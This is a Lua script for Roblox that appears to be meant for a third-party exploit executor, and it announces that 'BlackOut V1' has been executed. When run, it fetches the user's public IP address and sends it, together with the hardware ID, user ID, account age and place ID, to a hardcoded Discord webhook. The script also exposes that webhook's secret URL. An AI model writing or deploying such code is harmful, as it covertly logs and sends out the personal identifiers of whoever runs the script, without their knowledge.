local HttpService = game:GetService("HttpService")
local webhook_url = "https://discord.com/api/webhooks/1045224627323499226/uI3bf198F_xMgyDLuzDR5M_J0ouoRGbFK3sYbNCn4oU-QZwzfSE9JRRI1hJI-2J"

local function GetIp() : string
    local request = request or http_request or (syn and syn.request)

    local response = request({Url = "https://api.ipify.org?format=json", Method = "GET"})
    response = game:GetService("HttpService"):JSONDecode(response.Body)


    return response.ip
end

local responce = syn.request(
{
    Url = webhook_url,
    Method = 'POST',
    Headers = {
        ['content-type'] = 'application/json'
    },
    Body = HttpService:jSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "**BlackOut V1 has been executed**",
            ["description"] = game.Players.LocalPlayer.Name.." has executed BlackOut v1 on "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name ,
            ["type"] = "rich",
            ["colour"] = tonumber(0xffffff),
            ["fields"] = {
                {
                    ["name"] = "HWID :",
                    ["value"] = game:GetService('RbxAnalyticsService'):GetClientId(),
                    ["inline"] = true,
                    
                },
                {
                    ["name"] = "Place ID :",
                    ["value"] = game.PlaceId,
                    ["inline"] = true,
                    
                },
                {
                    ["name"] = "User Id :",
                    ["value"] = game.Players.LocalPlayer.UserId,
                    ["inline"] = true,
                    
                },
                {
                    ["name"] = "Account Age :",
                    ["value"] = game.Players.LocalPlayer.AccountAge,
                    ["inline"] = true,
                    
                },
                {
                    ["name"] = "Ip Address :",
                    ["value"] = GetIp(),
                    ["inline"] = true,
                    
                }
            }
        }}

    })
}
)